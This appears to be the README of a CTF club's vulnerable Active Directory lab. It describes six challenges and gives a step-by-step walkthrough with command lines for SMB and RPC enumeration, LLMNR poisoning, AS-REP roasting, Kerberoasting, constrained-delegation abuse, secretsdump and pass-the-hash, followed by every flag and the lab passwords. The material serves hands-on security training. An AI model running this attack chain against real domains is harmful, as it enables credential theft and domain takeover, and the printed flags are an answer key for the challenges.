## VULNDC - Active Directory Challenges for DSU CTF Club

Spins up a vulnerable AD environment for practicing attack paths. Run `setup.ps1` on a domain controller. :)

## Challenges:
### Challenge 01 - All Guests Welcome (Easy)
All guests are welcome to this super duper secure restaurant!

### Challenge 02 - Lemonade Donuts And Pie! (Easy)
Somewhere, there's a secret password you can obtain to get a secret menu. I heard as long as you stay anonymous, you might be able to grab some lemonade, donuts, and pie.

### Challenge 03 - The Confused Waiter (Easy)
The restaurant recently hired a new waiter, and they've been wandering around trying to deliver someone's order. Nobody has responded yet, so if you respond to them, you may be able to score some free food!
When you find the requested share, make sure to format it as `DSU{<share>.local}.`

### Challenge 04 - The Cook's Secret Recipe (Medium)
If you give the cook a certain ticket, they will give you their secret formula. Apparently, from those who have obtained it already, you can ask for this ticket without any prior authorization.

### Challenge 05 - Ticket to the Secret Formula (Medium)
The manager of this joint is like Mr. Krabs. He protects the true secret formula with his life. However, being the boss, he also runs a special service that only a few know about. If you’re already a member of the restaurant, you might be able to uncover the manager’s secret ticket to the formula!

### Challenge 06 - Dangerous Management (Medium)
This manager guy really likes being in control. So much control, in fact, that he’s essentially the heart and soul of the restaurant. If you can take on the role of the manager, you might just be able to make decisions like you own the place.

## Full Walkthrough:
### Challenge 1: Guest SMB
```
nxc smb 192.168.1.10 -u 'Guest' -p '' --shares
impacket-smbclient Guest@192.168.1.10
use Secrets
cd Guest
get flag.txt
flag: DSU{0p3n_t0_3v3ry0n3}
```

### Challenge 2: Anonymous RPC
```
nxc smb 192.168.1.10 -u '' -p '' --users
(should output Menu user with plaintext password)
impacket-smbclient Menu:pink_lemonade@192.168.1.10
use Secrets
cd Menu
get flag.txt
flag: DSU{wh3n_l1f3_g1v3s_y0u_l3m0ns}
```

### Challenge 3: LLMNR
```
sudo responder -I eth0 -v
(should see poisoned LLMNR responses after about 2 minutes)
(flag is the queried share)
flag: DSU{orderup.local}
```

### Challenge 4: Kerberos Preauthentication
```
nxc smb 192.168.1.10 -u '' -p '' --users
(copy the usernames into a .txt file - Waiter, Cook, Manager, etc...)
impacket-GetNPUsers secure.local/ -dc-ip 192.168.1.10 -usersfile ./users.txt
(copy ASREP hash into file)
hashcat -m 18200 ./asrep /usr/share/wordlists/rockyou.txt

impacket-smbclient Cook:cookies4life@192.168.1.10
use Secrets
cd Cook
get flag.txt
flag: DSU{j3ss3_w3_n33d_t0_c00k}
```

### Challenge 5: Kerberos User SPNs
```
impacket-GetUserSPNs 'secure.local/Cook':'cookies4life' -dc-ip 192.168.1.10 -request
(copy TGSREP hash into file)
hashcat -m 13100 ./tgsrep /usr/share/wordlists/rockyou.txt

impacket-smbclient Manager:iamthebossofthehouse@192.168.1.10
use Secrets
cd Manager
get flag.txt
flag: DSU{k3rb3r04st_g0_brrrr}
```

### Challenge 6: Kerberos Constrained Delegation
```
impacket-findDelegation 'secure.local/Menu':'pink_lemonade' -dc-ip 192.168.1.10
(record the constrained delegation SPN - host/DC01)
impacket-getST -spn 'host/DC01' -impersonate 'DC01$' 'test.local/Manager:iamthebossofthehouse' -dc-ip 192.168.1.10
(should receive a successful ticket via S4U2Self/S4U2Proxy)
export KRB5CCNAME=<ticket.ccache>
(klist to view ticket contents)
impacket-secretsdump -k dc01

(should see lots of hashes and such flying across the screen, congrats! you've successfully compromised a domain controller!)
(copy the administrator NTLM hash - looks like Administrator:500:aad3b... - only copy the hash part)

(just an example hash, looks like this though)
impacket-smbclient Administrator@192.168.1.10 -hashes 'aad3b435b51404eeaad3b435b51404ee:16f2bd968f2885a410873b4efa104527'
use Secrets
cd Administrator
get flag.txt
flag: DSU{d3l3g4t10n_f0r_th3_w1n}
```
